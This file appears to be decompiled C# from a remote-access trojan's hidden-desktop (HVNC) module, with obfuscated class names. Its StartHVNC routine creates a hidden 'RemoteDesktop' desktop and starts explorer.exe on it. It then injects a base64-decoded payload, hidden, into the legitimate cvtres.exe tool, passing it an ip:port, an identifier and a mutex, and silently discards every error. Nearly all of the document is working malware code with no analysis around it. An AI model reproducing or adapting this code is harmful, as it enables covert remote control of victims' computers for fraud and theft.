using System;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class unnokw_hvnc
{
	public struct SECURITY_ATTRIBUTES
	{
		public int nLength;

		public IntPtr lpSecurityDescriptor;

		public int bInheritHandle;
	}

	public static byte[] dLByte;

	public const uint CCHDEVICENAME = 32u;

	public const uint CCHFORMNAME = 32u;

	public const uint DF_ALLOWOTHERACCOUNTHOOK = 1u;

	public const uint DESKTOP_CREATEMENU = 4u;

	public const uint DESKTOP_CREATEWINDOW = 2u;

	public const uint DESKTOP_ENUMERATE = 64u;

	public const uint DESKTOP_HOOKCONTROL = 8u;

	public const uint DESKTOP_JOURNALPLAYBACK = 32u;

	public const uint DESKTOP_JOURNALRECORD = 16u;

	public const uint DESKTOP_READOBJECTS = 1u;

	public const uint DESKTOP_SWITCHDESKTOP = 256u;

	public const uint DESKTOP_WRITEOBJECTS = 128u;

	public static IntPtr hNewDesktop;

	public static SECURITY_ATTRIBUTES SA;

	public static int PID;

	[DllImport("user32.dll", CharSet = CharSet.Unicode, EntryPoint = "CreateDesktopW", SetLastError = true)]
	public static extern IntPtr CreateDesktop(string desktopName, IntPtr device, IntPtr deviceMode, uint flags, uint accessMask, SECURITY_ATTRIBUTES attributes);

	public static void StartHVNC(string ipport, string Identifier, string mutex)
	{
		try
		{
			SA.bInheritHandle = -1;
			SA.lpSecurityDescriptor = (IntPtr)0L;
			hNewDesktop = CreateDesktop("RemoteDesktop", (IntPtr)0L, (IntPtr)0L, 1u, 511u, SA);
			unnokw_ru.PROCESS_INFORMATION processInformation = default(unnokw_ru.PROCESS_INFORMATION);
			unnokw_ru.STARTUP_INFORMATION startupInfo = default(unnokw_ru.STARTUP_INFORMATION);
			startupInfo.cb = Marshal.SizeOf(typeof(unnokw_ru.STARTUP_INFORMATION));
			startupInfo.lpDesktop = "RemoteDesktop";
			IntPtr intPtr = default(IntPtr);
			unnokw_ru.CreateProcessA(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 3) + "Windows\\explorer.exe", null, intPtr, intPtr, inheritHandles: false, 0u, IntPtr.Zero, null, ref startupInfo, ref processInformation);
			dLByte = Convert.FromBase64String("");
			if (Directory.Exists("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\"))
			{
				unnokw_ru.TryRun("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\cvtres.exe", Identifier + " " + ipport + " " + mutex, dLByte, compatible: true, hidden: true, "RemoteDesktop", PID);
			}
			else if (Directory.Exists("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\"))
			{
				unnokw_ru.TryRun("C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\cvtres.exe", Identifier + " " + ipport + " " + mutex, dLByte, compatible: true, hidden: true, "RemoteDesktop", PID);
			}
		}
		catch (Exception)
		{
		}
	}
}
